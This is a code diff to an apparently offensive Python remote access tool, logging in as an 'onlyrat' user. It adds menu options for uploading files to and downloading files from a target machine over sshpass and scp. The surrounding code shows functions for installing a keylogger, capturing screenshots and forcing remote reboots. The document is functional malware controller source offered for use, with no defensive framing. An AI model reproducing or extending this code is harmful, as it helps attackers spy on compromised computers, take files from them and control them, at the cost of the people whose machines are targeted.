@@ -107,15 +107,33 @@ def random_text():
     return ''.join(s.choice(string.ascii_letters+string.digits) for _ in range(r.randint(8,17)))
 
 # scp upload
-def remote_upload(ipv4,pword,file_path,upload_path):
-    os.system(f"sshpass -p \"{pword}\" scp -r {file_path} onlyrat@{ipv4}:{upload_path}")
+def remote_upload(ipv4,pword,local_file_path,remote_upload_path):
+    print("\n[*] starting upload...")
+    os.system(f"sshpass -p \"{pword}\" scp -r {local_file_path} onlyrat@{ipv4}:{remote_upload_path}")
+    print("[+] upload complete...\n")
 
 # scp download
-def remote_download(ipv4,pword,path_to_file):
-    os.system(f"sshpass -p \"{pword}\" scp -r onlyrat@{ipv4}:{path_to_file} ~/Downloads")
+def remote_download(ipv4,pword,remote_path_to_file):
+    print("\n[*] starting download...")
+    os.system("mkdir ~/Downloads")
+    os.system(f"sshpass -p \"{pword}\" scp -r onlyrat@{ipv4}:{remote_path_to_file} ~/Downloads")
+    print("[+] Download saved at \"~/Downloads\" directory\n")
 
 def remote_command(ipv4,pword,command):
     os.system(f"sshpass -p \'{pword}\' ssh onlyrat@{ipv4} '{command}'")
+
+def download(ipv4,pword):
+    print("\n[~] Enter the file path you want to download :")
+    download_file_path = input(header)
+    print("\n[*] Downloading...")
+    remote_download(ipv4,pword,download_file_path)
+
+def upload(ipv4,pword,temp_dir):
+    print("\n[~] Enter the file path you want to upload :")
+    upload_file_path = input(header)
+    print("\n[*] Uploading...")
+    remote_upload(ipv4,pword,upload_file_path,temp_dir)
+    print(f"[+] Successfully uploaded at \"{temp_dir}\"")
 
 def keylogger(ipv4,pword,temp_path,startup_path):
     print("[+] Initializing keylogger....")
@@ -198,6 +216,10 @@ def cli(arguments):
                     install_screenshot(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "4":
                     fetch_screenshot(tgt_ipv4,tgt_pword,tgt_td,tgt_uname)
+                elif option == "5":
+                    download(tgt_ipv4,tgt_pword)
+                elif option == "6":
+                    upload(tgt_ipv4,tgt_pword,tgt_td)
                 elif option == "7":
                     remote_command(tgt_ipv4,tgt_pword,"shutdown /r /t 0")
                 elif option == "8":
